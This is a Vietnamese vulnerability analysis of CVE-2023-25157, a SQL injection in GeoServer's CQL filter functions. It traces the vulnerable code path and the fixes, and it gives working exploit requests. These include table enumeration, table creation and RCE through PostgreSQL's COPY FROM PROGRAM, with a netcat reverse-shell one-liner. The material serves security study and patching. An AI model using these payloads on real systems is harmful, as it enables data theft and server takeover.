# Phân tích CVE-2023-25157 - GeoServer SQL Injection

## 1. Giới thiệu GeoServer
GeoServer là một máy chủ mã nguồn mở với mục đích kết nối những thông tin địa lý có sẵn tới các WebGIS (trang web địa lý) sử dụng chuẩn mở.

GeoServer có thể đọc được nhiều định dạng dữ liệu, bao gồm PostGIS, Oracle
Spatital, ArcSDE, DB2, MySQL, Shapefile, GeoTIFF, GTOPO30 và nhiều loại
khác. Bên cạnh đó, GeoServer còn có thể chỉnh sửa dữ liệu nhờ những thành phần xử lý của chuẩn Web Feature Server.

GeoServer chủ yếu được xây dựng trên Spring Framework. Tuy nhiên, GeoServer cũng sử dụng một số thư viện và framework khác, bao gồm:

- **GeoTools**: Một thư viện Java mã nguồn mở cung cấp các công cụ cho dữ liệu không gian địa lý. GeoServer sử dụng GeoTools cho nhiều chức năng cốt lõi của nó, chẳng hạn như đọc, ghi và chuyển đổi dữ liệu.
- **Hibernate Validator**: Dùng để validate Java bean.
- **Apache Wicket**: Được sử dụng cho giao diện quản trị web. Đó là một web Framework dựa trên các thành phần tương tự như JavaServer Faces (JSF) và Tapestry.
- **Log4J**:  Dùng để hỗ trợ log.

## 2. Giới thiệu lỗ hổng CVE-2023-25157
Với CVSS 9.8 (Critical), đây được đánh giá là một lỗ hổng ở mức nghiêm trọng, việc khai thác thành công có thể dẫn đến rò rỉ, sửa đổi dữ liệu, hay dẫn đến tấn công từ chối dịch vụ .CVE-2023-25157 liên quan đến lỗ hổng SQL Injection tồn tại trong OGC (Open Geospatial Consortium) query function mà GeoServer sử dụng. GeoServer hỗ trợ sử dụng Filter Expression Language OGC và Common Query Language OGC (CQL) như một phần của các giao thức Web Feature Service (WFS), Web Map Service (WMS) và Web Coverage Service (WCS). Dưới đây là chi tiết về các lỗ hổng được tìm thấy trong GeoServer:

- `PropertyIsLike` filter: Lỗ hổng này xuất hiện khi PropertyIsLike filter được sử dụng với trường dạng String kết hợp với bất kỳ Relational database-based Store. PostGIS DataStore với các hàm encode được kích hoạt hoặc bất kỳ image mosaic nào có được index trong Relational Database là 1 trong những trường hợp tồn tại lỗ hổng.
- `strEndsWith`function: Lỗ hổng này phát sinh khi chức năng strEndsWith được sử dụng với PostGIS DataStore có sử dụng hàm encode.
- `strStartsWith` function: Tương tự với `strEndsWith`.
- `FeatureId` filter: Lỗ hổng này xuất hiện FeatureId filter được sử dụng với bất kỳ bảng cơ sở dữ liệu nào có khóa chính ở dạng String cùng điều kiện Prepared Statement không được sử dụng.
- `jsonArrayContains` function: Lỗ hổng này được tìm thấy khi hàm jsonArrayContains được sử dụng với trường dạng String hoặc JSON và với PostGIS DataStore hoặc Oracle (chỉ trong GeoServer 2.22.0 và các phiên bản mới hơn).
- `DWithin` filter: Lỗ hổng này được phát hiện khi DWithin filter được sử dụng với Oracle DataStore.

## 3. Các phiên bản tồn tại lỗ hổng CVE-2023-25157

GeoServer: < 2.21.4, >= 2.22.0, < 2.22.2.
Các bản vá đã được ra mắt, tham khảo tại: https://github.com/geoserver/geoserver/releases.

## 4. Chuẩn bị môi trường debug

- PostgreSQL và PostGIS: 2 cái này search Google rồi cài theo hướng dẫn.
- GeoServer source: Ở đây mình dùng phiên bản GeoServer 2.22.1. Download tại đây: https://github.com/geoserver/geoserver/archive/refs/tags/2.22.1.zip
- IDE: IntelliJ (bản Community hay Ultimate đều được).
- Sau khi cài xong các mục trên, setup project để chạy được trên IntelliJ theo link https://docs.geoserver.org/latest/en/developer/quickstart/intellij.html
- Sau đó thêm sample data vào theo link https://docs.geoserver.org/latest/en/user/gettingstarted/postgis-quickstart/index.html

##  5. Phân tích lỗ hổng

Setup môi trường như mục bên trên, chạy debug trong IntelliJ. Mặc định GeoServer sẽ chạy ở port 8080. 
Để khai thác lỗ hổng này, trước tiên cần phải có 2 thông tin:

- Tên Feature đang có trong Database.
- Properties cho mỗi Feature tương ứng.

Gửi request sau đến GeoServer để lấy được tên Feature có sẵn:
```
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
```
Response:

![enter image description here](https://imgur.com/KsY8GUV.png)

Theo response trên, lấy được Feature name là `nyc:nyc_buildings`.

Request để lấy Feature Properties:

```
GET /geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&maxFeatures=1&outputFormat=json HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
```

Các bạn thay `nyc:nyc_buildings` ở URL bằng Feature Name lấy được ở request trước.
Response:

![enter image description here](https://imgur.com/L1FlE7h.png)

Theo response trên, lấy được Feature Properties là `bin`.

Sau khi có đủ 2 trường cần thiết là Feature Name và Feature Properties, ta đã có thể khai thác lỗ hổng SQLi trên GeoServer.
 
 Trước khi đi vào debug, dưới đây là một số tổ hợp phím tắt trong IntelliJ để tiết kiệm thời gian:
 
 - Shift + Shift = tìm file theo tên.
 - Ctrl + F12 = tìm Method trong file.
 - Ctrl + Shift + F = tìm text từ mọi nơi.
 - F8 = Step Over - Nhảy đến dòng tiếp theo trong debug.
 - F9 = Resume Program - Bỏ qua các bước tiếp theo trong debug, return luôn cho client.
 - F7 = Step into - Nhảy vào method được thực thi trong luồng code đang chạy.
 - Shift + F8 = Step out - Ngược lại với step into, nhảy ra khỏi method đang được debug.


Ở đây mình chọn `strStartsWith` để phân tích về lỗ hổng.

Đầu tiên, đặt breakpoint vào phương thức getAggregateValue trong org.geotools.jdbc.JDBCDataSource.java. Gửi request như sau:

```
GET /geoserver/ows?service=wfs&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith%28bin%2C%27x%27%27%29+%3D+true+and+1%3D%28SELECT+CAST+%28%28SELECT+version()%29+AS+INTEGER%29%29+--+%27%29+%3D+true HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
```

Sau khi gửi request, debugger nhảy đến breakpoint được đặt, nhấn F8 cho đến phần sau đây của phương thức:

![enter image description here](https://imgur.com/yTOTbdP.png)

Về cơ bản, phương thức getAggregateValue thực hiện kiểm tra SQL dialect, tạo gọi đến các phương thức khác để tạo câu lệnh SQL tương ứng, thực thi bằng executeQuery và return kết quả hoặc throw nếu xảy ra Exception.

Nhấn F7 để nhảy vào phương thức selectAggregateSQL.

![enter image description here](https://imgur.com/jnsfGNa.png)

Ở đây gọi đến phương thức doSelectAggregateSQL, tiếp tục F7 để nhảy vào phương thức này.

F8 cho tới khi đến đoạn dưới đây:

![enter image description here](https://imgur.com/mPZuXoA.png)

Phương thức doSelectAggregateSQL có chức năng chính là để tạo ra câu lệnh SQL hoàn chỉnh.
Trong phương thức doSelectAggregateSQL, biến sql được append `SELECT `-> được xử lý bởi phương thức encodeFunction để append ` count(*) `-> được append ` FROM `-> được xử lý bởi phương thức encodeTableName để append `"public"."nyc_buildings"`-> append `WHERE`.

Tới đây, câu SQL có dạng:

`SELECT count(*) FROM "public"."nyc_buildings WHERE "`.

![enter image description here](https://imgur.com/xWjvJ7t.png)

Tại đây gọi đến phương thức filter để xử lý và append điều kiện vào sau "WHERE".

F7 để nhảy vào phương thức filter.

![enter image description here](https://imgur.com/CkNBsOm.png)

Tại đây gọi vào 1 phương thức filter khác. Tiếp tục F7.

![enter image description here](https://imgur.com/Ug1RW6Y.png)

Ở đây thực hiện encode Filter sang String và append trực tiếp vào phần điều kiện phía sau WHERE của biến sql. 
Tới đây, câu SQL có dạng:

```
SELECT count(*) FROM "public"."nyc_buildings" WHERE ("bin"::text LIKE 'x') = true and 1=(SELECT CAST ((SELECT version()) AS INTEGER)) -- %') = true
```

![enter image description here](https://imgur.com/DPKUNGK.png)

F8 cho đến khi nhảy ra phương thức getAggregateValue. Tại đây, câu SQL đã được hoàn thiện để thực hiện query xuống DB.

![enter image description here](https://imgur.com/8W5QkbB.png)

Câu lệnh SQL sau đó được thực thi bởi executeQuery và throw ra SQLException do không đoạn `SELECT CAST ((SELECT version()) AS INTEGER)`. Và Exception được trả ra output.

Response chứa thông tin về DB version:

![enter image description here](https://imgur.com/jKAK1l9.png)

Tóm tắt code flow:

![enter image description here](https://imgur.com/OguuQrE.png)

## 6. Khai thác sâu hơn: SQLi -> RCE

Điều kiện để RCE từ CVE-2023-25157:

- PostgreSQL đang sử dụng có phiên bản >= 9.3.
- session_user (của PostgreSQL) có quyền `pg_execute_server_program`.

Để RCE được, ta cần ép buộc PostgreSQL ở server thực thi thêm `COPY <table_name> FROM PROGRAM '<cmd_here>';`.
Vậy ở đây cần có table_name, có thể lấy từ các table có sẵn (session_user cần có quyền insert vào table đấy) hoặc tự tạo 1 table mới (session_user cần có quyền tạo table).

Ở đây mình chia thành 2 trường hợp:

- Trường hợp 1: session_user có không quyền tạo table.
- Trường hợp 2: session_user có quyền tạo table.

### 6.1. Trường hợp 1: session_user không có quyền tạo table:

Ta cần list table name.
Request để list table name:

```
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true+and+1%3D(SELECT+CAST+((SELECT+STRING_AGG(table_name,$$,$$)+FROM+information_schema.tables+WHERE+table_schema+NOT+IN+($$pg_catalog$$,$$information_schema$$)+AND+table_schema+NOT+LIKE+$$pg_toast%25$$)+AS+INTEGER))+--+%27)+%3D+true HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
```

Câu query được thực thi có dạng:
```
SELECT count(*) FROM "public"."nyc_buildings" WHERE ("bin"::text LIKE 'x') = true and 1=(SELECT CAST ((SELECT STRING_AGG(table_name,$$,$$) FROM information_schema.tables WHERE table_schema NOT IN ($$pg_catalog$$,$$information_schema$$) AND table_schema NOT LIKE $$pg_toast%$$) AS INTEGER)) -- %') = true
```

List table name lấy được sẽ dùng cho bước tiếp theo.

### 6.2. Trường hợp 2: session_user có quyền tạo table:

Request để tạo table (ví dụ table mới có tên là shell1):

```
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true;+CREATE+TABLE+shell1+AS+SELECT+1;+--+%27)+%3D+true HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
``` 

Câu query được thực thi có dạng: 
```
SELECT count(*) FROM "public"."nyc_buildings" WHERE ("bin"::text LIKE 'x') = true; CREATE TABLE shell1 AS SELECT 1; -- %') = true
```
Table mới này sẽ được dùng cho bước tiếp theo.

### 6.3. RCE

Có 2 lưu ý khi gửi payload để RCE:

- Để câu query ở vế 2 được thực thi thì câu query ở vế đầu tiên phải được thực thi thành công (không có lỗi). Vậy câu SQL cần phải bỏ phần `and 1=(SELECT CAST ((SELECT version()) AS INTEGER))` trước khi nối thêm vế 2 (là phần `COPY <table_name> FROM PROGRAM '<cmd_here>`).
- Nếu trong vế thứ 2 trong payload sử dụng  single-quoted string (dấu `'this is a string'`) để truyền cmd thì sẽ bị lỗi "Could not parse CQL filter list" do server không parse request để lấy CQL Filter List được. Do đó, ta cần thay bằng dollar-quoted string (`$$this is a string$$`). 

Request để RCE có dạng: 

```
GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true;+COPY+<table_name>+FROM+PROGRAM+$$<cmd_here>$$;+--+%27)+%3D+true HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Connection: close
```

Câu query có dạng:

```
SELECT count(*) FROM "public"."nyc_buildings" WHERE ("bin"::text LIKE 'x') = true; COPY <table_name> FROM PROGRAM $$<cmd_here>$$; -- %') = true
```

Với trường hợp session_user không có quyền tạo table: Lấy list table name đã có, thử bằng cách thay lần lượt vào <table_name> trong payload.
Với trường hợp session_user có quyền tạo table: Lấy tên của table vừa tạo, thay vào <table_name> trong payload.

Dưới đây là 2 ví dụ để chứng minh RCE:

1. Mở HTTP server ở local bằng python, port 80, thay `wget+http://localhost` vào <cmd_here> trong payload. Payload có dạng:
	```
	/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true;+COPY+shell1+FROM+PROGRAM+$$wget+http://localhost$$;+--+%27)+%3D+true
	```
	Gửi request và thấy ở localhost nhận được request -> chứng tỏ RCE thành công.
	
	![enter image description here](https://imgur.com/p3lU2p9.png)

	![enter image description here](https://imgur.com/OK6mjro.png)

2. Lấy quyền truy cập vào server bằng reverse shell.  

	Mở listener ở local bằng netcat, port 4444. Thay `rm+-f+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+127.0.0.1+4444+>/tmp/f` vào <cmd_here> trong payload. Payload có dạng:
	```
	/geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName=nyc:nyc_buildings&CQL_FILTER=strStartsWith(bin%2C%27x%27%27)+%3D+true;+COPY+shell1+FROM+PROGRAM+$$rm+-f+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+127.0.0.1+4444+>/tmp/f$$;+--+%27)+%3D+true
	```
	Gửi request và thấy ở local bắt được reverse shell session.

	![enter image description here](https://imgur.com/seEpmgE.png)
	![enter image description here](https://imgur.com/cBvyp7B.png)

	Lưu ý: Dù session_user của PostgreSQL là gì thì lệnh `id` cũng sẽ trả về là user postgres. Vì postgres là user của system, phụ trách kết nối từ PostgreSQL xuống system, còn session_user là user của riêng PostgreSQL, phụ trách thực thi query trong PostgreSQL, không liên quan đến system. 

## 7. Vá lỗ hổng

-   [GEOS-10842: JDBCConfig: escape user inputs in SQL queries](https://osgeo-org.atlassian.net/browse/GEOS-10842)
-   [GEOS-10839: JDBCConfig: add JDBC Configuration parameter to disable SQL comments and pretty-printing](https://osgeo-org.atlassian.net/browse/GEOS-10839)
-   [GEOT-7302: Escape user inputs in SQL queries](https://osgeo-org.atlassian.net/browse/GEOT-7302)

Tóm tắt các thay đổi:

- Query theo dạng PreparedStatement thay cho cộng chuỗi trực tiếp.
- SQL Comment Escaping: Escape các ký tự comment trong SQL.
- Append các chuỗi vào SQL theo điều kiện: Phương thức appendIfDebug đã được thêm vào lớp Dialect. Phương thức này append thêm một trong hai chuỗi được cung cấp vào SQL tùy thuộc vào việc chế độ debug có được bật hay không. Trong lớp Dialect.java, một trường debugMode được thêm vào và một phương thức setDebugMode() được cung cấp để thay đổi trạng thái của nó. Chế độ debug sau đó được sử dụng trong phương thức detect().
- Backslash, DoubleQuote Escaping.
- Sử dụng `writeLiteral()` thay cho `out.write()` để kiểm soát output một cách tốt hơn, giảm thiểu thông tin trả ra trong trường hợp vẫn bị khai thác SQLi.

## 8. Nguồn tham khảo

https://github.com/murataydemir/CVE-2023-25157-and-CVE-2023-25158

https://github.com/win3zz/CVE-2023-25157
